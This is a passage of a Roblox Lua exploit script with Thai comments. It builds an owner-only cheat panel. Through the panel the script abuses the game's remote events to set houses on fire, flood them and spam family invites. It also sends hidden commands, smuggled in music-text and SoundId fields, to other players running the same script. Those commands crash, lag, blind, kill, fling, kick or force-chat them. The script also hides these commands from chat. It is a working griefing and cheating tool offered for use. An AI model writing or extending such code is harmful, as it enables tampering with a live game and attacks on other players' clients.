        s.SoundId=buildAntiStealPayload("1")..packet
        s.Name="KFC_AdminCmd_"..nonce
        task.delay(2,function() pcall(function() s:Destroy() end) end)
    end)
    pcall(function()
        local RE=ReplicatedStorage:FindFirstChild("RE")
        local ev=RE and RE:FindFirstChild("PlayerToolEvent")
        if ev then ev:FireServer("ToolMusicText",packet,nil,false) end
    end)
end
_G.KFC_SendAdminCmd=sendAdminCommand

-- OWNER PERKS
local OwnerPerks={}
local function getRemote(name) local RE=ReplicatedStorage:FindFirstChild("RE"); return RE and RE:FindFirstChild(name) end
if isOwner() then
    function OwnerPerks.PlayMusic(audioId,useVehicle)
        local id=tostring(audioId):match("%d+") or tostring(audioId); if id=="" then return end
        local payload=buildAntiStealPayload(id)
        local ToolEv=getRemote("PlayerToolEvent"); local ScooterEv=getRemote("1NoMoto1rVehicle1s") or getRemote("1NoMo1torVeh1icle1s") or getRemote("PlayerScooterEvent")
        if ToolEv then pcall(function() ToolEv:FireServer("ToolMusicStop","",nil) end); task.wait(0.08); pcall(function() ToolEv:FireServer("ToolMusicText",payload,nil,true) end); pcall(function() ToolEv:FireServer("ToolMusic",id,1) end); pcall(function() ToolEv:FireServer("ToolMusicPlay","",nil) end) end
        if useVehicle and ScooterEv then pcall(function() ScooterEv:FireServer("PickingScooterMusicStop","",nil) end); task.wait(0.08); pcall(function() ScooterEv:FireServer("PickingScooterMusicText",payload,nil,true) end); pcall(function() ScooterEv:FireServer("PickingScooterMusic",id,1) end); pcall(function() ScooterEv:FireServer("PickingScooterMusicPlay","",nil) end) end
    end
    function OwnerPerks.StopMusic() local ToolEv=getRemote("PlayerToolEvent"); local ScooterEv=getRemote("1NoMoto1rVehicle1s") or getRemote("1NoMo1torVeh1icle1s"); if ToolEv then pcall(function() ToolEv:FireServer("ToolMusicStop","",nil) end); pcall(function() ToolEv:FireServer("ToolMusicText","") end) end; if ScooterEv then pcall(function() ScooterEv:FireServer("PickingScooterMusicStop","",nil) end); pcall(function() ScooterEv:FireServer("PickingScooterMusicText","") end) end end
    function OwnerPerks.HouseFire() local ev=getRemote("1Player1sHous1e"); if ev then pcall(function() ev:FireServer("HouseFire") end) end end
    function OwnerPerks.HouseFlood() local ev=getRemote("1Player1sHous1e"); if ev then pcall(function() ev:FireServer("SinkPool") end) end end
    function OwnerPerks.LockDoors() local ev=getRemote("1Player1sHous1e"); if ev then pcall(function() ev:FireServer("LockDoors") end); pcall(function() ev:FireServer("HouseDoorLock") end) end end
    function OwnerPerks.ToggleCurtains() local ev=getRemote("1Player1sHous1e"); if ev then pcall(function() ev:FireServer("Curtains") end) end end
    function OwnerPerks.GarageDoor() local ev=getRemote("1Player1sHous1e"); if ev then pcall(function() ev:FireServer("GarageDoor") end) end end
    function OwnerPerks.InviteAll() local ev=ReplicatedStorage:FindFirstChild("Remotes"); ev=ev and ev:FindFirstChild("InvitePlayerToFamily"); if not ev then return end; for _,p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer then pcall(function() ev:FireServer(p.UserId,"FamilyInviteMenu") end) end end end
    local rgbActive=false; local rgbConn=nil
    function OwnerPerks.RGBStart() if rgbActive then return end; rgbActive=true; rgbConn=RunService.Heartbeat:Connect(function() if not rgbActive then return end; local hue=(os.clock()*0.35)%1; local col=Color3.fromHSV(hue,0.9,1); local ev=getRemote("1RPHous1eEven1tColo1r"); if ev then pcall(function() ev:FireServer("PickingHouseColor",col) end) end end) end
    function OwnerPerks.RGBStop() rgbActive=false; if rgbConn then rgbConn:Disconnect(); rgbConn=nil end end
    local aaConn=nil
    function OwnerPerks.AntiAFKStart() if aaConn then return end; aaConn=LocalPlayer.Idled:Connect(function() pcall(function() VirtualUser:CaptureController(); VirtualUser:ClickButton2(Vector2.zero) end) end) end
    function OwnerPerks.AntiAFKStop() if aaConn then aaConn:Disconnect(); aaConn=nil end end
    OwnerPerks.AntiAFKStart()
end
_G.KFC_OwnerPerks=OwnerPerks

-- CHAT COMMAND HANDLER
local function handleChatCommand(raw)
    local args = {}; for w in raw:gmatch("%S+") do args[#args+1]=w end
    if #args == 0 then return end
    local cmd = args[1]:lower()
    
    if cmd == "help" then print("[KFC v11] ;su-crash, ;su-fling, ;su-cage, ;su-speed <n>, ;su-showmsg <text>"); return end
    
    if cmd:sub(1,3) == "su-" or cmd=="scan" then
        if not isLocalAdmin() then print("[KFC] Admin only"); return end
        local action = cmd:sub(4):upper()
        if cmd=="scan" then print("[KFC] Scanning..."); return end
        
        local targetNames = {}
        for name,_ in pairs(DetectedUsers) do if name ~= LocalPlayer.Name then table.insert(targetNames, name) end end
        if #targetNames == 0 then print("[KFC] No script users found."); return end

        for _, target in ipairs(targetNames) do
            sendAdminCommand(target, action, args[2])
        end
        print("[KFC] Sent "..action.." to "..#targetNames.." users.")
        return
    end
end

pcall(function()
    if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
        local origSD = TCS.ShouldDeliverCallback
        TCS.ShouldDeliverCallback = function(msg, src)
            local txt = msg.Text or ""
            if txt:sub(1,1) == ";" or txt:sub(1,1) == ":" then task.spawn(function() handleChatCommand(txt:sub(2)) end); return false end
            if origSD then return origSD(msg, src) end
            return true
        end
    end
end)
LocalPlayer.Chatted:Connect(function(m)
    if m:sub(1,1) == ";" or m:sub(1,1) == ":" then if TCS.ChatVersion ~= Enum.ChatVersion.TextChatService then handleChatCommand(m:sub(2)) end end
end)

-- ═══════════════════════════════════════════════════════════════════
-- UI CREATION (FIXED + SCALING)
-- ═══════════════════════════════════════════════════════════════════
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KFC_LOLASSR5_Root"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 9999
ScreenGui.Parent = GuiParent

local uiScale = Instance.new("UIScale")
uiScale.Parent = ScreenGui
local function updateUIScale()
    local vp = Camera.ViewportSize
    local target = math.min(vp.X / 400, vp.Y / 600)
    uiScale.Scale = math.clamp(target, 0.65, 1.0)
end
updateUIScale()
Camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateUIScale)

local safeTop   = isMobile and 44 or 0
local safeBot   = isMobile and 34 or 0
local panelW    = isMobile and 310 or 340
local panelH    = isMobile and 460 or 500
local btnH      = isMobile and 42 or 36
local fontSize  = isMobile and 14 or 13
local fontSizeS = isMobile and 12 or 11

local ToggleSG = Instance.new("ScreenGui")
ToggleSG.Name = "KFC_LOLASSR5_Toggle"
ToggleSG.ResetOnSpawn = false
ToggleSG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ToggleSG.IgnoreGuiInset = true
ToggleSG.DisplayOrder = 99999
ToggleSG.Parent = GuiParent

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
ToggleBtn.Position = UDim2.new(0, 10, 0.5, -25)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(14, 16, 22)
ToggleBtn.BackgroundTransparency = 0.1
ToggleBtn.BorderSizePixel = 0
ToggleBtn.Text = "⚡"
ToggleBtn.TextSize = 24
ToggleBtn.TextColor3 = T.Accent
ToggleBtn.Font = Font
ToggleBtn.AutoButtonColor = false
ToggleBtn.Parent = ToggleSG
addCorner(ToggleBtn, 25)
addStroke(ToggleBtn, T.Accent, 0.3, 2)

-- ══════════ แก้บั๊กปุ่ม ⚡ ลากทับคลิก ══════════
local toggleDragging = false
local toggleDidDrag = false
local toggleStartPos
local toggleStartMouse

ToggleBtn.InputBegan:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.Touch or inp.UserInputType == Enum.UserInputType.MouseButton1 then
        toggleDragging = true
        toggleDidDrag = false
        toggleStartPos = ToggleBtn.Position
        toggleStartMouse = inp.Position
    end
end)

UserInputService.InputChanged:Connect(function(inp)
    if toggleDragging and (inp.UserInputType == Enum.UserInputType.Touch or inp.UserInputType == Enum.UserInputType.MouseMovement) then
        local delta = inp.Position - toggleStartMouse
        if math.abs(delta.X) > 5 or math.abs(delta.Y) > 5 then
            toggleDidDrag = true
            local vp = Camera.ViewportSize
            local newX = math.clamp(toggleStartPos.X.Offset + delta.X, 0, vp.X - 50)
            local newY = math.clamp(toggleStartPos.Y.Offset + delta.Y, 0, vp.Y - 50)
            ToggleBtn.Position = UDim2.new(0, newX, 0, newY)
        end
    end
end)

UserInputService.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.Touch or inp.UserInputType == Enum.UserInputType.MouseButton1 then
        toggleDragging = false
    end
end)
-- ══════════════════════════════════════════════

local PanelOpen = false
local Panel = newFrame(ScreenGui, UDim2.new(0, panelW, 0, panelH), UDim2.new(0.5, -panelW/2, 0.5, -panelH/2), T.Glass, T.GlassT)
Panel.Visible = false
addCorner(Panel, 14)
addStroke(Panel, T.Border, T.BorderT, 1)

-- Drag Panel
local draggingPanel = false; local panelDragStart; local panelStartPos
UserInputService.InputChanged:Connect(function(inp)
    if draggingPanel and (inp.UserInputType == Enum.UserInputType.Touch or inp.UserInputType == Enum.UserInputType.MouseMovement) then
        local delta = inp.Position - panelDragStart
        local vp = Camera.ViewportSize
        local newX = math.clamp(panelStartPos.X.Scale * vp.X + panelStartPos.X.Offset + delta.X, 0, vp.X - panelW)
        local newY = math.clamp(panelStartPos.Y.Scale * vp.Y + panelStartPos.Y.Offset + delta.Y, safeTop, vp.Y - panelH - safeBot)
        Panel.Position = UDim2.new(0, newX, 0, newY)
    end
end)
UserInputService.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.Touch or inp.UserInputType == Enum.UserInputType.MouseButton1 then draggingPanel = false end
end)

local Header = newFrame(Panel, UDim2.new(1,0,0,isMobile and 54 or 46), UDim2.new(0,0,0,0), Color3.fromRGB(10,12,18), 0.1)
addCorner(Header, 14)
Header.InputBegan:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.Touch or inp.UserInputType == Enum.UserInputType.MouseButton1 then
        draggingPanel = true; panelDragStart = inp.Position; panelStartPos = Panel.Position
    end
end)

newLabel(Header, "⚡ KFC — "..OWNER_NAME, UDim2.new(1,-110,1,0), UDim2.new(0,12,0,0), T.FSTit, T.Accent, Font)

local CloseBtn = newButton(Header, "✕", UDim2.new(0,isMobile and 42 or 34,0,isMobile and 42 or 34), UDim2.new(1,-isMobile and 46 or 38,0.5,-(isMobile and 21 or 17)), fontSize, T.White)
CloseBtn.BackgroundColor3 = T.Red; CloseBtn.BackgroundTransparency = 0.3
CloseBtn.MouseButton1Click:Connect(function() playClickSound(); PanelOpen = false; Panel.Visible = false end)

local MinBtn = newButton(Header, "─", UDim2.new(0,isMobile and 42 or 34,0,isMobile and 42 or 34), UDim2.new(1,-(isMobile and 92 or 76),0.5,-(isMobile and 21 or 17)), fontSize, T.White)
MinBtn.BackgroundColor3 = T.Amber; MinBtn.BackgroundTransparency = 0.3

-- Command Bar
local CmdBar = newFrame(Panel, UDim2.new(1, -16, 0, 34), UDim2.new(0, 8, 0, isMobile and 58 or 50), T.Card, 0.3)
addCorner(CmdBar, 8); addStroke(CmdBar, T.Border, 0.6, 1)
local CmdInput = Instance.new("TextBox")
CmdInput.Size = UDim2.new(1, -16, 1, 0); CmdInput.Position = UDim2.new(0, 8, 0, 0)
CmdInput.BackgroundTransparency = 1; CmdInput.PlaceholderText = "พิมพ์คำสั่ง... (เช่น ;su-crash)"
CmdInput.PlaceholderColor3 = T.Muted; CmdInput.Text = ""; CmdInput.TextColor3 = T.White
CmdInput.TextSize = 12; CmdInput.Font = FontNorm; CmdInput.TextXAlignment = Enum.TextXAlignment.Left
CmdInput.ClearTextOnFocus = false; CmdInput.Parent = CmdBar
CmdInput.FocusLost:Connect(function(enter)
    if enter and CmdInput.Text ~= "" then
        local txt = CmdInput.Text
        if txt:sub(1,1) == ";" or txt:sub(1,1) == ":" then txt = txt:sub(2) end
        handleChatCommand(txt)
        CmdInput.Text = ""
    end
end)

local TabBar = newFrame(Panel, UDim2.new(1,0,0,isMobile and 42 or 36), UDim2.new(0,0,0,isMobile and 96 or 86), Color3.fromRGB(10,12,18), 0.15)
addListLayout(TabBar, 0, Enum.FillDirection.Horizontal)

local tabNames = isOwner() and {"Music","Admin","Extra","House","Settings"} or {"Music","Settings"}
local tabBtns = {}
local activeTab = tabNames[1]

local TabContent = newFrame(Panel, UDim2.new(1,0,1,-(isMobile and 138 or 122)), UDim2.new(0,0,0,isMobile and 138 or 122), Color3.fromRGB(0,0,0), 0.95)
local tabPages = {}
for _, name in ipairs(tabNames) do
    local page = newFrame(TabContent, UDim2.new(1,0,1,0), UDim2.new(0,0,0,0), Color3.fromRGB(0,0,0), 1)
    page.Visible = (name == activeTab)
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1,0,1,0); scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0; scroll.ScrollBarThickness = isMobile and 3 or 4
    scroll.ScrollBarImageColor3 = T.Accent; scroll.CanvasSize = UDim2.new(0,0,0,0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y; scroll.Parent = page
    addListLayout(scroll, 6); addPadding(scroll, 8, 8)
    tabPages[name] = { page = page, scroll = scroll }
end

local function switchTab(name)
    activeTab = name
    for n, pg in pairs(tabPages) do pg.page.Visible = (n == name) end
    for _, b in pairs(tabBtns) do
        b.TextColor3 = (b.Name == name) and T.Accent or T.Muted
        b.BackgroundTransparency = (b.Name == name) and 0.5 or 0.85
    end
end

for i, name in ipairs(tabNames) do
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1/#tabNames, 0, 1, 0)
    b.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
    b.BackgroundTransparency = name == activeTab and 0.5 or 0.85
    b.Text = name; b.TextSize = fontSizeS; b.TextColor3 = name == activeTab and T.Accent or T.Muted
    b.Font = FontNorm; b.Name = name; b.AutoButtonColor = false; b.Parent = TabBar
    tabBtns[name] = b
    b.MouseButton1Click:Connect(function() playClickSound(); switchTab(name) end)
end

local function addSection(scroll, text)
    return newLabel(scroll, text, UDim2.new(1,0,0,22), UDim2.new(0,0,0,0), fontSizeS, T.Muted, FontNorm)
end
local function addBtn(scroll, text, color, onClick)
    local b = newButton(scroll, text, UDim2.new(1,-16,0,btnH), UDim2.new(0,8,0,0))
    if color then b.TextColor3 = color end
    b.MouseButton1Click:Connect(function() playClickSound(); if onClick then onClick() end end)
    return b
end
local function addInput(scroll, placeholder)
    local container = newFrame(scroll, UDim2.new(1,-16,0,btnH+4), UDim2.new(0,8,0,0), T.Card, T.CardT)
    addCorner(container, 8); addStroke(container, T.Border, 0.6, 1)
    local inp = Instance.new("TextBox")
    inp.Size = UDim2.new(1,-16,1,0); inp.Position = UDim2.new(0,8,0,0)
    inp.BackgroundTransparency = 1; inp.PlaceholderText = placeholder or ""
    inp.PlaceholderColor3 = T.Muted; inp.Text = ""; inp.TextSize = fontSize
    inp.TextColor3 = T.White; inp.Font = FontNorm; inp.TextXAlignment = Enum.TextXAlignment.Left
    inp.ClearTextOnFocus = false; inp.Parent = container
    return inp
end

-- Music Tab
do
    local sc = tabPages["Music"].scroll
    addSection(sc, "── 🎵 PLAY MUSIC (LOLASSR5 ONLY) ──")
    local idInp = addInput(sc, "Audio ID เช่น 1836009206")
    addBtn(sc, "▶  เล่นเพลง (Boombox)", T.Green, function() if isOwner() then OwnerPerks.PlayMusic(idInp.Text, false) end end)
    addBtn(sc, "🛹  เล่นเพลง (Boombox + Skateboard)", T.Blue, function() if isOwner() then OwnerPerks.PlayMusic(idInp.Text, true) end end)
    addBtn(sc, "⏹  หยุดเพลง", T.Red, function() if isOwner() then OwnerPerks.StopMusic() end end)
end

-- Admin Tab
if isOwner() then
    local sc = tabPages["Admin"].scroll
    addSection(sc, "── 👤 TARGET ──")
    local targetInp = addInput(sc, "ชื่อผู้เล่นเป้าหมาย")
    local payloadInp = addInput(sc, "Payload (เช่น speed:150)")
    
    addBtn(sc, "🔍 สแกนผู้ใช้สคริปต์ในเซิร์ฟ", T.Blue, function()
        local found = {}
        for name, _ in pairs(DetectedUsers) do table.insert(found, name) end
        if #found == 0 then print("[KFC v11] ไม่พบผู้ใช้สคริปต์") else print("[KFC v11] พบ: "..table.concat(found, ", ")) end
    end)
    
    addSection(sc, "── ⚔️ COMBAT ──")
    local combatCmds = { {"☠️ Kill","KILL",T.Red}, {"🕳️ Void","VOID",T.Red}, {"🌪️ Fling","FLING",T.Red}, {"🌤️ Sky","SKY",T.Amber}, {"🔄 Reset","RESET",T.Amber}, {"🎯 Bring Here","BRING",T.Green}, {"🚶 Goto Target","GOTO",T.Green} }
    for _, cmd in ipairs(combatCmds) do
        addBtn(sc, cmd[1], cmd[3], function()
            if targetInp.Text == "" then print("[KFC v11] ใส่ชื่อเป้าหมายก่อน"); return end
            sendAdminCommand(targetInp.Text, cmd[2], payloadInp.Text)
        end)
    end

    addSection(sc, "── 🔒 CONTROL ──")
    local controlCmds = { {"❄️ Freeze","FZON",T.Blue}, {"🔓 Unfreeze","FZOF",T.Green}, {"👣 Follow On","FWON",T.Amber}, {"🛑 Follow Off","FWOF",T.Red}, {"👻 Noclip Toggle","NOCLIP",T.Purple}, {"🫥 Invisible Toggle","INVIS",T.Purple}, {"💫 Spin Toggle","SPIN",T.Amber} }
    for _, cmd in ipairs(controlCmds) do
        addBtn(sc, cmd[1], cmd[3], function()
            if targetInp.Text == "" then print("[KFC v11] ใส่ชื่อเป้าหมายก่อน"); return end
            sendAdminCommand(targetInp.Text, cmd[2])
        end)
    end

    addSection(sc, "── 🎮 SPECIAL ──")
    local spCmds = { {"💬 Force Chat","CHAT",T.Blue}, {"🎵 Play Music","MUSIC",T.Green}, {"⏹ Stop Music","STOPMUSIC",T.Red}, {"🕺 Dance","DANCE",T.Amber}, {"🗿 Big Head","BIGHEAD",T.Purple}, {"🏃 Set Speed","SPEED",T.Blue}, {"🦘 Set Jump","JUMP",T.Blue}, {"🌟 Godmode","GODMODE",T.Green}, {"☀️ Fullbright","BRIGHT",T.Amber}, {"🔌 Kick","KICK",T.Red}, {"💥 Unload Script","UNLOAD",T.Red} }
    for _, cmd in ipairs(spCmds) do
        addBtn(sc, cmd[1], cmd[3], function()
            if targetInp.Text == "" then print("[KFC v11] ใส่ชื่อเป้าหมายก่อน"); return end
            sendAdminCommand(targetInp.Text, cmd[2], payloadInp.Text)
        end)
    end
    
    addSection(sc, "── 🌐 ALL USERS ──")
    addBtn(sc, "📡 ส่งคำสั่งทุกคนในเซิร์ฟ (all)", T.Red, function()
        local action = payloadInp.Text
        if action == "" then print("[KFC v11] ใส่ action ใน Payload field"); return end
        sendAdminCommand("all", string.upper(action))
    end)
end

-- EXTRA SU COMMANDS TAB
if isOwner() then
    local sc = tabPages["Extra"].scroll
    addSection(sc, "⚔️ EXTRA SU COMMANDS (Target All Script Users)")
    
    local function runSU(action, param)
        local l = {}
        for name, _ in pairs(DetectedUsers) do
            if name ~= LocalPlayer.Name then table.insert(l, name) end
        end
        if #l == 0 then print("[KFC] No script users found."); return end
        for _, n in ipairs(l) do sendAdminCommand(n, action, param) end
    end
    
    addBtn(sc, "💥 Crash All (200 parts)", T.Red, function() runSU("CRASH") end)
    addBtn(sc, "🐌 Lag All (50 particles)", T.Amber, function() runSU("LAG") end)
    addBtn(sc, "🕶️ Blind All (5s)", T.Red, function() runSU("BLIND") end)
    addBtn(sc, "🔒 Cage All (10s)", T.Amber, function() runSU("CAGE") end)
    addBtn(sc, "👕 Strip All (accessories)", T.Red, function() runSU("STRIP") end)
    addBtn(sc, "👁️ Hide UI All", T.Blue, function() runSU("HIDEUI") end)
    addBtn(sc, "👁️ Show UI All", T.Green, function() runSU("SHOWUI") end)
    addBtn(sc, "☠️ Kill All Script Users", T.Red, function() runSU("KILL") end)
    addBtn(sc, "🌀 Fling All Script Users", T.Red, function() runSU("FLING") end)
    
    local msgInput = addInput(sc, "Message to broadcast...")
    addBtn(sc, "📢 Send Message to All SU", T.Blue, function()
        if msgInput.Text ~= "" then runSU("SHOWMSG", msgInput.Text) end
    end)
end

-- House Tab
if isOwner() then
    local sc = tabPages["House"].scroll
    addSection(sc, "── 🏠 HOUSE CONTROLS ──")
    addBtn(sc, "🔥 House Fire", T.Red, function() OwnerPerks.HouseFire() end)
    addBtn(sc, "💧 House Flood", T.Blue, function() OwnerPerks.HouseFlood() end)
    addBtn(sc, "🔒 Lock Doors", T.Amber, function() OwnerPerks.LockDoors() end)
    addBtn(sc, "🪟 Toggle Curtains", T.White, function() OwnerPerks.ToggleCurtains() end)
    addBtn(sc, "🚗 Garage Door", T.White, function() OwnerPerks.GarageDoor() end)
    addBtn(sc, "👨‍👩‍👧 Invite All Family", T.Green, function() OwnerPerks.InviteAll() end)
    addSection(sc, "── 🌈 RGB ──")
    addBtn(sc, "🌈 RGB House Start", T.Accent, function() OwnerPerks.RGBStart() end)
    addBtn(sc, "⬜ RGB House Stop", T.Muted, function() OwnerPerks.RGBStop() end)
end

-- Settings Tab
do
    local sc = tabPages["Settings"].scroll
    addSection(sc, "── ⚙️ GENERAL ──")
    addBtn(sc, "🔊 Anti-AFK On", T.Green, function() if isOwner() then OwnerPerks.AntiAFKStart() end end)
    addBtn(sc, "🔇 Anti-AFK Off", T.Red, function() if isOwner() then OwnerPerks.AntiAFKStop() end end)
    
    addSection(sc, "── ℹ️ INFO ──")
    newLabel(sc, "Owner: LOLASSR5\nAnti-Steal: v12 Obsidian + Stage1 Trap\nAdmin Cmds: 25 + Extra SU\nMobile UI: Fixed & Scaled", UDim2.new(1,-16,0,90), UDim2.new(0,8,0,0), fontSizeS, T.Muted, FontNorm)
end

-- Minimize Logic
local isMinimized = false
local normalH = panelH
MinBtn.MouseButton1Click:Connect(function()
    playClickSound()
    isMinimized = not isMinimized
    TweenService:Create(Panel, TweenInfo.new(0.22, Enum.EasingStyle.Quart), {
        Size = isMinimized and UDim2.new(0, panelW, 0, isMobile and 54 or 46) or UDim2.new(0, panelW, 0, normalH)
    }):Play()
    CmdBar.Visible = not isMinimized
    TabBar.Visible = not isMinimized
    TabContent.Visible = not isMinimized
    MinBtn.Text = isMinimized and "□" or "─"
end)

-- Toggle Button Click (Fixed Bug)
ToggleBtn.MouseButton1Click:Connect(function()
    if toggleDidDrag then return end
    playClickSound()
    PanelOpen = not PanelOpen
    if PanelOpen then
        Panel.Visible = true
        Panel.Size = UDim2.new(0, panelW, 0, 0)
        Panel.BackgroundTransparency = 1
        TweenService:Create(Panel, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {
            Size = UDim2.new(0, panelW, 0, normalH),
            BackgroundTransparency = T.GlassT
        }):Play()
    else
        TweenService:Create(Panel, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
            Size = UDim2.new(0, panelW, 0, 0),
            BackgroundTransparency = 1
        }):Play()
        task.delay(0.22, function() Panel.Visible = false end)
    end
end)

print("[KFC v12] โหลดสำเร็จ! ป้องกันการดักจับจาก Stage1 ด้วยระบบ Double-Key Trap เรียบร้อยแล้ว")